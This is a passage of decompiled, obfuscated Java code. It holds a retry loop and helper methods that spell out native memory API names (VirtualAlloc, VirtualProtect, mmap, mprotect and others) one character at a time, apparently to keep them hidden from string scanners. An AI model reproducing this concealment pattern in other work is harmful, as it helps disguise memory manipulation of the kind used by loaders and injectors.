      } else if (!l.c() && !l.d()) {
         if (l.b()) {
            label104: {
               if (b()) {
                  try {
                     if (c(var0, (Object)null) == 0) {
                        break label104;
                     }
                  } catch (Throwable var13) {
                     var13.printStackTrace();
                  }
               }

               try {
                  if (b(var0) == 0) {
                  }
               } catch (Throwable var10) {
                  var10.printStackTrace();
               }
            }
         }
      } else {
         label154: {
            if (b()) {
               try {
                  if (b(var0, (Object)null) == 0) {
                     break label154;
                  }
               } catch (Throwable var14) {
                  var14.printStackTrace();
               }
            }

            try {
               if (b(var0) == 0) {
               }
            } catch (Throwable var11) {
               var11.printStackTrace();
            }
         }
      }

      for(int var18 = 0; var18 < 5; ++var18) {
         try {
            if (l.n((Object)null) == null) {
               l.a.remove(Properties.class);
               return true;
            }
         } catch (Throwable var9) {
         }

         try {
            Thread.sleep(200L);
         } catch (InterruptedException var8) {
         }
      }

      l.a.remove(Properties.class);
      return false;
   }

   private static String a() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('p');
      var0.append('i');
      var0.append('d');
      return var0.toString();
   }

   private static String b() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('P');
      var0.append('r');
      var0.append('o');
      var0.append('t');
      var0.append('e');
      var0.append('c');
      var0.append('t');
      return var0.toString();
   }

   private static String c() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('A');
      var0.append('l');
      var0.append('l');
      var0.append('o');
      var0.append('c');
      return var0.toString();
   }

   private static String d() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('l');
      var0.append('i');
      var0.append('b');
      var0.append('d');
      var0.append('y');
      var0.append('l');
      var0.append('d');
      var0.append('.');
      var0.append('d');
      var0.append('y');
      var0.append('l');
      var0.append('i');
      var0.append('b');
      return var0.toString();
   }

   private static String e() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('V');
      var0.append('i');
      var0.append('r');
      var0.append('t');
      var0.append('u');
      var0.append('a');
      var0.append('l');
      var0.append('F');
      var0.append('r');
      var0.append('e');
      var0.append('e');
      return var0.toString();
   }

   private static String f() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('m');
      var0.append('u');
      var0.append('n');
      var0.append('m');
      var0.append('a');
      var0.append('p');
      return var0.toString();
   }

   private static String g() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('m');
      var0.append('p');
      var0.append('r');
      var0.append('o');
      var0.append('t');
      var0.append('e');
      var0.append('c');
      var0.append('t');
      return var0.toString();
   }

   private static String h() {
      StringBuilder var0;
      (var0 = new StringBuilder()).append('m');
      var0.append('m');
      var0.append('a');
      var0.append('p');
      return var0.toString();
   }
}
